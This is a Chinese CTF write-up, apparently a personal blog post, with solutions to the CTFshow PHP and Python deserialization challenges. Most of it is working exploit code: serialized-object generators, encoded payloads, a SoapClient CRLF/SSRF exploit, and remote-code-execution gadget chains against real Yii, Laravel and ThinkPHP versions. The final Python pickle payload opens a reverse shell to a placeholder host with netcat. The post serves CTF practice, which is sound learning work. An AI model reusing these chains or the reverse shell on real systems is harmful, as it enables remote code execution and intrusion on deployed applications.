---
title: CTFshow 反序列化wp
date: 2020-12-02 20:03:53
categories: CTF做题记录
---

>说一些有的没的：\
`payload`（有效攻击负载）是包含在你用于一次漏洞利用（exploit）中的ShellCode中的主要功能代码\
`shellcode`（可提权代码） 对于一个漏洞来说，ShellCode就是一个用于某个漏洞的二进制代码框架，有了这个框架你可以在这个ShellCode中包含你需要的Payload来做一些事情\
`exp` (Exploit )漏洞利用，一般是个demo程序\
`poc`(Proof of Concept)漏洞证明，一般就是个样本 用来证明和复现\
`vul`：(Vulnerability)  :漏洞\
`Pwn`：是一个黑客语法的俚语词  ，是指攻破设备或者系统、
作者：一个人的朝圣之路
链接：https://www.zhihu.com/question/26053378/answer/186414523

<!-- TOC -->

- [web254](#web254)
- [web255](#web255)
- [web256](#web256)
- [web257](#web257)
- [web258](#web258)
- [web259](#web259)
- [web263](#web263)
- [web265](#web265)
- [web266](#web266)
- [web267](#web267)
- [web268](#web268)
- [web269](#web269)
- [web270](#web270)
- [web271](#web271)
- [web272](#web272)
- [web274](#web274)
- [web276](#web276)
- [web277 | 278](#web277--278)

<!-- /TOC -->

<!--more-->

# web254
没啥说的，两组xxxxxx，看不懂的建议移步[php教程](https://www.runoob.com/php/php-tutorial.html)

# web255
cookie的反序列，记得url编码，第一题写个简单exp，反序列化看情况总结一下是啥，现在懒得动23333
```php
<?php
# @Author:      yq1ng
# @Date:        2020-12-2 20:00
# @challenges： web255

class ctfShowUser{
	public $isVip=true;
}
$a = new ctfShowUser();
echo(urlencode(serialize($a)));
```

# web256
```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 19:29:02
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            if($this->username!==$this->password){
                    echo "your flag is ".$flag;
              }
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);    
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
}
```
看清楚，判断了user!==pass，所以反序列化自己该个user值就好
```php
<?php
# @Author:      yq1ng
# @Date:        2020-12-2 20:05
# @challenges： web256

class ctfShowUser{
	public $username='yq1ng';
    public $password='xxxxxx';
	public $isVip=true;
}
$a = new ctfShowUser();
echo(urlencode(serialize($a)));
```

# web257
一开始想考wekeup，后来群主说现在php8了，就不考了~~其实docker没找到~~\
CVE-2016-7124漏洞，当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行
```php
public function __wakeup(){
        $this->username=md5(mt_rand());
        $this->password=md5(mt_rand());
    }
```
改成链子了，很短，就两个
```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 20:33:07
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);

class ctfShowUser{
    private $username='xxxxxx';
    private $password='xxxxxx';
    private $isVip=false;
    private $class = 'info';

    public function __construct(){
        $this->class=new info();
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function __destruct(){
        $this->class->getInfo();
    }

}

class info{
    private $user='xxxxxx';
    public function getInfo(){
        return $this->user;
    }
}

class backDoor{
    private $code;
    public function getInfo(){
        eval($this->code);
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);
    $user->login($username,$password);
}
```
反序列化触发back函数就行，exp：
```php
<?php
# @Author:      yq1ng
# @Date:        2020-12-2 21:20
# @challenges： web257

class ctfShowUser{
	private $class = 'backDoor';

    public function __construct(){
    	$this->class=new backDoor();
    }
}

class backDoor{
    private $code = 'system("cat `ls`");';
}

$a = new ctfShowUser();

echo(serialize($a)."\n");
echo("\n".urlencode(serialize($a))."\n");
```
经admin师傅发的payload改了下exp
```php
<?php
# @Author:      yq1ng
# @Date:        2020-12-2 21:20
# @challenges： web257

class ctfShowUser{
	public $class = 'yq1ng';//随意，但是要改为public
}

class backDoor{
    public $code = 'system("cat `ls`");';
}

$a = new ctfShowUser();
$b = new backDoor();
$a->class = $b;

echo(serialize($a)."\n");
echo("\n".urlencode(serialize($a))."\n");
```

# web258
对user有了过滤，类似xctf的Web_php_unserialize
```php
if(!preg_match('/[oc]:\d+:/i', $_COOKIE['user'])){
        $user = unserialize($_COOKIE['user']);
    }
```
```re
解释：
[oc] --> 匹配内部某个字符
\d --> 匹配数字
+ --> 匹配至少一个
```
用+号绕过正则，上一题生成的payload里面的两个`O:`后面加一个`+`，最终payload：`%4f%3a%2b%31%31%3a%22%63%74%66%53%68%6f%77%55%73%65%72%22%3a%31%3a%7b%73%3a%35%3a%22%63%6c%61%73%73%22%3b%4f%3a%2b%38%3a%22%62%61%63%6b%44%6f%6f%72%22%3a%31%3a%7b%73%3a%34%3a%22%63%6f%64%65%22%3b%73%3a%31%39%3a%22%73%79%73%74%65%6d%28%22%63%61%74%20%60%6c%73%60%22%29%3b%22%3b%7d%7d`

# web259
这就是传说中的SoapCLient+CRLF组合拳\
一开始环境坏了没回显，和群主测试许久，最后重新部署了，更改flag.php如下：
```php
$xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
array_pop($xff);
$ip = array_pop($xff);


if($ip!=='127.0.0.1'){
	die('error');
}else{
	$token = $_POST['token'];
	if($token=='ctfshow'){
		file_put_contents('flag.txt',$flag);
	}
}
```
详细的我就不写辣，大家可以看看[Y4佬的blog](https://y4tacker.blog.csdn.net/article/details/110521104)，exp如下：
```php
<?php
# @Author:      yq1ng
# @Date:        2020-12-3 00:00
# @challenges： web259

$headers = array(
    'X-Forwarded-For: 127.0.0.1,127.0.0.1,127.0.0.1,127.0.0.1,127.0.0.1',
    'Cookie: UM_distinctid=175da3584e611e-004301709460d3-930346c-100200-175da3584e889'
);
$post_string = 'token=ctfshow';

$soapClient = new SoapClient(
	null,
	array(
		'user_agent' => "m3w\x0D\x0Ahello: 1\x0D\x0AContent-Type: application/x-www-form-urlencoded\x0D\x0A".join("\x0D\x0A",$headers)."\x0D\x0AContent-Length: ". (string)strlen($post_string)."\x0D\x0A\x0D\x0A".$post_string, 
		'location' => "http://127.0.0.1/flag.php",
		'uri' => 'http://127.0.0.1/flag.php'
	)
);

echo (urlencode(serialize($soapClient)));
```

# web263
sql失败，简单fuzz了，也不会是sql，毕竟是反序列化系列，`URL/www.zip`存在源码泄露，下载后用了seay源码审计系统~~我是蓝狗~~，发现在`inc.php`的第45行有`file_put_contents`，可写木马，user控制文件名，pass写一句话
```php
class User{
    public $username;
    public $password;
    public $status;
    function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }
    function setStatus($s){
        $this->status=$s;
    }
    function __destruct(){
        file_put_contents("log-".$this->username, "使用".$this->password."登陆".($this->status?"成功":"失败")."----".date_create()->format('Y-m-d H:i:s'));
    }
}
```


# web265
```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-04 23:52:24
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-05 00:17:08
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
include('flag.php');
highlight_file(__FILE__);
class ctfshowAdmin{
    public $token;
    public $password;

    public function __construct($t,$p){
        $this->token=$t;
        $this->password = $p;
    }
    public function login(){
        return $this->token===$this->password;
    }
}

$ctfshow = unserialize($_GET['ctfshow']);
$ctfshow->token=md5(mt_rand());

if($ctfshow->login()){
    echo $flag;
}
```
```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author:  yq1ng
# @Date:    2020-12-08 16:30
# @Changes: web265
*/

class ctfshowAdmin{
    public $token = "vip";
    public $password = "vip";
}

$yq1ng = new ctfshowAdmin();
$yq1ng->password =& $yq1ng->token;//引用
echo urlencode(serialize($yq1ng));
```

# web266
```php
<?php
highlight_file(__FILE__);

include('flag.php');
$cs = file_get_contents('php://input');


class ctfshow{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public function __construct($u,$p){
        $this->username=$u;
        $this->password=$p;
    }
    public function login(){
        return $this->username===$this->password;
    }
    public function __toString(){
        return $this->username;
    }
    public function __destruct(){
        global $flag;
        echo $flag;
    }
}
$ctfshowo=@unserialize($cs);
if(preg_match('/ctfshow/', $cs)){
    throw new Exception("Error $ctfshowo",1);
}
```
```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author:  yq1ng
# @Date:    2020-12-08 16:42
# @Changes: web266
*/

class ctfshow{
    public $username='xxxxxx';
    public $password='xxxxxx';
}

$yq1ng = new ctfshow();
echo serialize($yq1ng);
```
直接在hackbar里面提交是不行的，没有参数自然传不上去，要用bp，因为最后两行代码ban了小写的ctfshow，POST的时候大写绕过
![BP-POST](https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.t5klgajabys.png)
but，why？本地测试对象字符串大小写随意更改都可以正常反序列化
```php
<?php

class ctfshowA{
    public $username='xxxxxx';
    public $password='xxxxxx';
}

//$yq1ng = new ctfshowA();
//echo (serialize($yq1ng));
var_dump(unserialize('O:8:"ctfshowa":2:{s:8:"username";s:6:"xxxxxx";s:8:"password";s:6:"xxxxxx";}'));
var_dump(unserialize('O:8:"CtfshowA":2:{s:8:"username";s:6:"xxxxxx";s:8:"password";s:6:"xxxxxx";}'));
```
在Google一番后倒是找到一个php常识 -----> `PHP大小写：函数名和类名不区分,变量名区分`，参考链接[点此](https://www.cnblogs.com/zrp2013/category/491430.html)，测试了一下，还真是，测试代码：
```php
<?php

class ctfshow{
    public $username='xxxxxx';
    public $password='xxxxxx';
}

class Ctfshow{
	public $username='xxxxxx';
    public $password='xxxxxx';
}

//丢Error：Fatal error: Cannot declare class Ctfshow, because the name is already in use in F:\CTF\script\php\test.php on line 14
//该类名已经使用
```
涨姿势了

# web267
>yii框架的反序列化，本题无回显\
参考：https://www.cnblogs.com/thresh/p/13743081.html\
多谢Y4与群主帮助

弱口令登陆，在about页面下有`<!--view-source-->`~~藏的够深~~，与url拼接，这里不是直接`?xxx`，而是直接在最后`&view-source`，why？看看yii路由是什么样的，[传送门](https://www.yiiframework.com/doc/guide/2.0/zh-cn/runtime-routing)，之后sys被ban（反正我是不能用）参考群主的payload用的`shell_exec`，最后exp
```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author:  
# @Date:    2020-12-09
# @Changes: web267
*/

namespace yii\rest{
    class CreateAction{
        public $checkAccess;
        public $id;

        public function __construct(){
            $this->checkAccess = 'exec';
            $this->id = 'cp /flag /var/www/html/basic/web/yq1ng.txt';
        }
    }
}

namespace Faker{
    use yii\rest\CreateAction;

    class Generator{
        protected $formatters;

        public function __construct(){
            $this->formatters['close'] = [new CreateAction, 'run'];
        }
    }
}

namespace yii\db{
    use Faker\Generator;

    class BatchQueryResult{
        private $_dataReader;

        public function __construct(){
            $this->_dataReader = new Generator;
        }
    }
}
namespace{
    echo base64_encode(serialize(new yii\db\BatchQueryResult));
}
```
payload：`URL/index.php?r=backdoor/shell&code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6MTA6InNoZWxsX2V4ZWMiO3M6MjoiaWQiO3M6NDI6ImNwIC9mbGFnIC92YXIvd3d3L2h0bWwvYmFzaWMvd2ViL3lxMW5nLnR4dCI7fWk6MTtzOjM6InJ1biI7fX19fQ==`，路由还是通过r，有机会复现一波yii框架，最后访问`URL/yq1ng.txt`

# web268
上一题的exp，过滤了flag，用`cat /fl* > yq1ng.txt`，默认生成文件在当前目录，所以直接访问`URL/yq1ng.txt`即可

# web269
换poc了，参考[Thresh｜](https://www.cnblogs.com/thresh/archive/2004/01/13/13743081.html)师傅的poc4，这次不能用cat了，直接`cp /f* yq1ng.txt`走一波
```php
<?php
namespace yii\rest {
    class Action
    {
        public $checkAccess;
    }
    class IndexAction
    {
        public function __construct($func, $param)
        {
            $this->checkAccess = $func;
            $this->id = $param;
        }
    }
}
namespace yii\web {
    abstract class MultiFieldSession
    {
        public $writeCallback;
    }
    class DbSession extends MultiFieldSession
    {
        public function __construct($func, $param)
        {
            $this->writeCallback = [new \yii\rest\IndexAction($func, $param), "run"];
        }
    }
}
namespace yii\db {
    use yii\base\BaseObject;
    class BatchQueryResult
    {
        private $_dataReader;
        public function __construct($func, $param)
        {
            $this->_dataReader = new \yii\web\DbSession($func, $param);
        }
    }
}
namespace {
    $exp = new \yii\db\BatchQueryResult('shell_exec', 'cp /f* yq1ng.txt');
    echo(base64_encode(serialize($exp)));
}
```

# web270
上一题的exp

# web271
参考博客[点此](https://laworigin.github.io/2019/02/21/laravelv5-7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce/)，laravel 5.7的反序列化rce
```php
<?php
namespace Illuminate\Foundation\Testing{
	class PendingCommand{
		protected $command;
		protected $parameters;
		protected $app;
		public $test;

		public function __construct($command, $parameters,$class,$app)
	    {
	        $this->command = $command;
	        $this->parameters = $parameters;
	        $this->test=$class;
	        $this->app=$app;
	    }
	}
}

namespace Illuminate\Auth{
	class GenericUser{
		protected $attributes;
		public function __construct(array $attributes){
	        $this->attributes = $attributes;
	    }
	}
}


namespace Illuminate\Foundation{
	class Application{
		protected $hasBeenBootstrapped = false;
		protected $bindings;

		public function __construct($bind){
			$this->bindings=$bind;
		}
	}
}

namespace{
	echo urlencode(serialize(new Illuminate\Foundation\Testing\PendingCommand("system",array('cat /flag'),new Illuminate\Auth\GenericUser(array("expectedOutput"=>array("0"=>"1"),"expectedQuestions"=>array("0"=>"1"))),new Illuminate\Foundation\Application(array("Illuminate\Contracts\Console\Kernel"=>array("concrete"=>"Illuminate\Foundation\Application"))))));
}
?>
```

# web272
上面5.7的不行了，用5.8的版本，[参考](https://xz.aliyun.com/t/5911)，一开始没用成，报错了，看了yu师傅的博客才知道用`exit`提前结束脚本，tql
```php
<?php
namespace PhpParser\Node\Scalar\MagicConst{
    class Line {}
}
namespace Mockery\Generator{
    class MockDefinition
    {
        protected $config;
        protected $code;

        public function __construct($config, $code)
        {
            $this->config = $config;
            $this->code = $code;
        }
    }
}
namespace Mockery\Loader{
    class EvalLoader{}
}
namespace Illuminate\Bus{
    class Dispatcher
    {
        protected $queueResolver;
        public function __construct($queueResolver)
        {
            $this->queueResolver = $queueResolver;
        }
    }
}
namespace Illuminate\Foundation\Console{
    class QueuedCommand
    {
        public $connection;
        public function __construct($connection)
        {
            $this->connection = $connection;
        }
    }
}
namespace Illuminate\Broadcasting{
    class PendingBroadcast
    {
        protected $events;
        protected $event;
        public function __construct($events, $event)
        {
            $this->events = $events;
            $this->event = $event;
        }
    }
}
namespace{
    $line = new PhpParser\Node\Scalar\MagicConst\Line();
    $mockdefinition = new Mockery\Generator\MockDefinition($line,"<?php system('cat /f*');exit;?>");
    $evalloader = new Mockery\Loader\EvalLoader();
    $dispatcher = new Illuminate\Bus\Dispatcher(array($evalloader,'load'));
    $queuedcommand = new Illuminate\Foundation\Console\QueuedCommand($mockdefinition);
    $pendingbroadcast = new Illuminate\Broadcasting\PendingBroadcast($dispatcher,$queuedcommand);
    echo urlencode(serialize($pendingbroadcast));
}
?>
```

# web274
ThinkPHP V5.1，直接搜，我偷懒了嘿嘿，用的[yu师傅](https://blog.csdn.net/miuzzx/article/details/110558192)找到的[博客](https://xz.aliyun.com/t/6619)，用法：`?lin=cat /f*&data=`
```php
<?php
namespace think;
abstract class Model{
    protected $append = [];
    private $data = [];
    function __construct(){
        $this->append = ["lin"=>["calc.exe","calc"]];
        $this->data = ["lin"=>new Request()];
    }
}
class Request
{
    protected $hook = [];
    protected $filter = "system";
    protected $config = [
        // 表单ajax伪装变量
        'var_ajax'         => '_ajax',  
    ];
    function __construct(){
        $this->filter = "system";
        $this->config = ["var_ajax"=>'lin'];
        $this->hook = ["visible"=>[$this,"isAjax"]];
    }
}


namespace think\process\pipes;

use think\model\concern\Conversion;
use think\model\Pivot;
class Windows
{
    private $files = [];

    public function __construct()
    {
        $this->files=[new Pivot()];
    }
}
namespace think\model;

use think\Model;

class Pivot extends Model
{
}
use think\process\pipes\Windows;
echo base64_encode(serialize(new Windows()));
?>
```

# web276

# web277 | 278
源码有：`<!--/backdoor?data= m=base64.b64decode(data) m=pickle.loads(m) -->`，搜了一下是python的反序列化，推荐[K0rz3n](https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/)师傅写的，很详细
```python
import pickle
import base64
class A(object):
    def __reduce__(self):
        return(eval,('__import__("os").popen("nc xxx.xxx.xxx.xxx vps-port -e /bin/sh").read()',))
a=A()
test=pickle.dumps(a)
print(base64.b64encode(test))
```